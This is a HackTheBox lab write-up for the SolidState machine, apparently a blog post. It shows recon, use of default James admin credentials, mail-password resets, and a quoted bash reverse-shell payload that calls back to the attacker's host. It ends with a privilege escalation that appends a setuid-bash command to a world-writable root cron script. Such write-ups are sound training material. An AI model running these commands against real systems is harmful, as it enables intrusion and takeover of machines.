---
layout: post
name: solidstate
title: "HackTheBox: SolidState"
date: 2022-10-28 06:00:00 +1000
categories: red-team
tags: linux apache-james bash-completion rce cron
summary: Priority message for Mr. dot-dot-slash-dot-dot-slash..
excerpt_separator: <!--more-->
---

<!--more-->

<p align="center"><img src="/assets/images/solidstate/SolidState.png" /></p>

### // Lessons Learned
1. While `/etc/crontab, cron.d, cron.hourly, cron.daily` etc. are the most common locations to find cron configurations, don't forget about user-owned crons kept in `/var/spool/cron` (though they likely won't be readable as an unprivileged user).
2. Sending passwords via email never gets old.

### // Recon
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ nmap -p- -A solidstate.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 06:49 AEST
Nmap scan report for solidstate.htb (10.10.10.51)
Host is up (0.023s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.14.13 [10.10.14.13]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
119/tcp  open  nntp    JAMES nntpd (posting ok)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=10/28%Time=635AEF0F%P=aarch64-unknown-linux-g
SF:nu%r(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3
SF:\.2\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\
SF:nPassword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 260.19 seconds
```

Nmap reveals the target is likely Debian Linux, running a number of common and uncommon services:
- ssh via `OpenSSH 7.4p1` on port `22`
- smtp via `JAMES smtpd 2.3.2` on port `25`
- http via `Apache httpd 2.4.25` on port `80`
- pop3 via `JAMES pop3d 2.3.2` on port ``0
- nntp (network news transfer protocol, used to transfer the infamous Usenet news articles across the early internet), again via `JAMES nntpd`
- rsip (realm-specific internet protocol, once considered as a replacement for NAT but in this case providing JAMES remote administration) on port `4555`

Beginning with the webserver, the target is hosting a business site for *Solid State Security* -

![](/assets/images/solidstate/1.png)

There are only a handful of pages available on the site - index.html, about.html and services.html, which includes a not-yet implemented contact form. Both [feroxbuster](https://github.com/epi052/feroxbuster) and [gobuster](https://github.com/OJ/gobuster) fail to discover any additional content or vhosts, so it's likely the path to an initial foothold lies elsewhere.

### // Initial Foothold
Apart from OpenSSH, the remainder of the open ports are all provided by [Apache James](https://james.apache.org/) (Java Apache Mail Enterprise Server). Running version `2.3.2` through [searchsploit](https://www.exploit-db.com/searchsploit) reveals a python3-based [exploit](https://www.exploit-db.com/exploits/50347) for authenticated RCE (remote code execution), by taking advantage of a failure to validate user input. Essentially, the administration terminal interface on port `4555` includes functionality to create new users, such that when a new user e.g `dade` is added, a folder is created for them at a path like `/opt/james-2.3.2/apps/james/var/mail/inboxes/dade`. This input however is lacking validation, meaning that a directory-traversal attack is possible. The linked exploit attempts to create a user named `../../../../../../../../etc/bash_completion.d`, a system folder that will likely exist already and is designed to store scripts that should be executed whenever someone logs onto the system. It then does that very thing by sending an email to the new user, putting a script in place that will run establish a reverse shell on the next login event:
```
payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
```

The only requirement to begin is that the credentials to the admin interface are known or still set to the default `root / root`, which a simple telnet session confirms is the case:
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ telnet solidstate.htb 4555
Trying 10.10.10.51...
Connected to solidstate.htb.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Running the exploit is straightforward, with just our attack box ip and listening port required:
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ python 50347.py solidstate.htb 10.10.14.13 443
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.14.13/443 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 443
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 443 before logging in!
```

All that's required now is to establish a listener and wait for someone to log on to the system. Logins from imaginary users is not typically something that happens on HTB machines, so we may have to find a way to initiate one ourselves. Another command available to us through the James admin port is `setpassword`, meaning we can set the mail password for any user to whatever we wish:
```
setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
...
```

At this point we can telnet to the server via POP3 on port 110 and check for mail. The first user discovered with new messages is `john`:
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ telnet solidstate.htb 110
Trying 10.10.10.51...
Connected to solidstate.htb.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

Based on this message, our next user is obviously `mindy`:
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ telnet solidstate.htb 110
Trying 10.10.10.51...
Connected to solidstate.htb.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass mindy
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
```

```
list
+OK 2 1945
1 1109
2 836
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

Though access will apparently be restricted, we should now be able to ssh onto the target as `mindy`:
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ ssh mindy@solidstate.htb    
mindy@solidstate.htb's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
```

Despite operating in a restricted environment, it turns out the user key is in Mindy's home directory:
```
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
eece4a**************************
```

### // Privilege Escalation
At the same time as our login as mindy, the reverse shell listener also receives a connection:
```
┌──(kali㉿kali)-[~/HTB/boxes/solidstate]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.51] 60422
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
whoami
mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

There's obviously some kind of chroot (change root) setup being used to restrict mindy to her home folder, but this shell doesn't have the same constraints, allowing us to freely search for privesc vectors. A common location on unix-based systems for installing custom software is `/opt`, which is where we find the james server files:
```
cd /opt
ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27 11:05 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  179 Nov  1 18:03 tmp.py
```

Alongside the james folder is also a `tmp.py` python script, owned by `root` but world-writeable:
```
cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

It isn't immediately obvious what the point of this script is or how it's designed to be used, but if we can write to a root-owned script then it never hurts to try and slide in a command to generate a setuid shell in the process:
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo "os.system('cp /bin/bash /home/mindy/bash && chmod 4755 /home/mindy/bash')" >> /opt/tmp.py
```

Sure enough within a short period, a new binary appears in our home folder:
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /home/mindy
ls -l /home/mindy
total 2056
-rwsr-xr-x 1 root  root  1265272 Nov  1 22:12 bash
drwxr-x--- 2 mindy mindy    4096 Apr 26  2021 bin
-rw------- 1 mindy mindy      33 Nov  1 17:39 user.txt
```

Which can be used to elevate to root:
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./bash -p
./bash -p
whoami
root
```

and retrieve the root-flag from the usual location:
```
cat /root/root.txt
c5ccfa**************************
```

So what actually invoked the `tmp.py` script? Running [pspy](https://github.com/DominicBreuker/pspy) offers an explanation:
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32                                                                                                                    
./pspy32                                                                                                                                                                          
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                                                                     
                                                                                                                                                                                  
                                                                                                                                                                                  
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                                           
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                                                           
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                                                                           
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                                                           
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                                           
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                                            
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                                                            
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                                                             
                   ░           ░ ░                                                                                                                                                
                               ░ ░                                                                                                                                                
                                                                                                                                                                                  
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /t
mp /etc /home /var /opt] (recursive) | [] (non-recursive)                                                                                                                         
Draining file system events due to startup...                                                                                                                                     
done                                                                                                                                                                              
2022/11/01 23:38:21 CMD: UID=0    PID=99     |                                                                                                                                    
2022/11/01 23:38:21 CMD: UID=0    PID=98     |
...
2022/11/01 23:39:01 CMD: UID=0    PID=25617  | /usr/sbin/CRON -f 
2022/11/01 23:39:01 CMD: UID=0    PID=25618  | /bin/sh -c python /opt/tmp.py 
2022/11/01 23:39:01 CMD: UID=0    PID=25619  | python /opt/tmp.py
...
```

Cron (run by root with the `-f` flag, which causes it to run in the foreground) is being invoked every few minutes, which in turn runs the `tmp.py` script. Once we have a root shell, the configuration that actually connects the two is readable in `/var/spool/cron/crontabs/root`:
```
...
# m h  dom mon dow   command
*/3 * * * * python /opt/tmp.py
```

![](/assets/images/solidstate/2.png)
